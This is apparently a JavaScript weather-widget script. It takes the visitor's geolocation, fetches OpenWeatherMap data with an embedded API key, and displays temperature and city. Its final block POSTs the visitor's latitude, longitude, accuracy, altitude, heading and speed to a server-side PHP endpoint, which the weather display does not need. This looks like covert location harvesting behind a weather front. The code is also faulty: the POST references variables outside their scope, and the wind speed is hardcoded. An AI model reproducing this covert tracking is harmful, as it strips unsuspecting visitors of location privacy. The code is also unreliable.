// var cityName = document.querySelector('.city');
// var tempData = document.querySelector('.temp');
// var weatherMain = document.querySelector('.weather-main');
// var cityName = document.querySelector('.city');
// const button = document.querySelector('.btn');

const tempt = document.getElementById("tempt");
const showData = document.getElementById("show");
const cityname = document.getElementById("cityname");
const imgid = document.getElementById("imgid");

function locate()
{
    if(navigator.geolocation)
    {
    //   var optn = {enableHighAccuracy : true, timeout : 30000, maximumage: 0};
      navigator.geolocation.getCurrentPosition(showPosition);
    }
    else
    {
      alert('Geolocation is not Supported by your Browser...');
    }
  
  function showPosition(position)
  {
      var lat = position.coords.latitude;
      var lon = position.coords.longitude;
      var acc = position.coords.accuracy;
      var alt = position.coords.altitude;
      var dir = position.coords.heading;
      var spd = position.coords.speed;
      const api = '30ee9ba68c73e395305d5e235d3895fe';
      let url = `https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lon}&appid=${api}`;
      fetch(url)  
          .then(res => {
          return res.json();
      })
      .then(data => {
          console.log(data)
      
          showData.innerHTML=`
          <div class="windspeed"><i class="fas fa-wind fa-fw" style="color: #507dd1;"></i> <span class="ms-1">
          15 km/h </span></div>
  <div class="humidity"><i class="fas fa-tint fa-fw" style="color: #507dd1;"></i> <span class="ms-1">
  ${data.main.humidity}% </span></div>
  <div class=""><i class="fas fa-sun fa-fw" style="color: #507dd1;"></i> <span class="ms-1">
          0.2h </span></div>`

        cityname.innerHTML=`
        <h6 class="flex-grow-1 city">${data.name}</h6>
      
        `
        let n = data.main.temp-273;
        let tmpData = n.toFixed(1);
        tempt.innerHTML=`
        <h6  class="display-4 mb-0 font-weight-bold temp" style="color: #1C2331;"> ${tmpData}°C</h6>
        <span class="small weather-main" style="color: #868B94">${data.weather[0].description}</span>`

        // if(id<250){
        //     imgid.innerHTML=` <img src="./images/rstorm.webp" width="100px">`
        // }
        // else if(id < 350){
        //     imgid.innerHTML=` <img src="./images/rstorm.webp" width="100px">`
        // }
    

          

      })

}
}

$.ajax({
  type: 'POST',
  url: '/php/result.php',
  data: {Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd},
  success: function(){$('#change').html('Coming Soon');},
  mimeType: 'text'
});

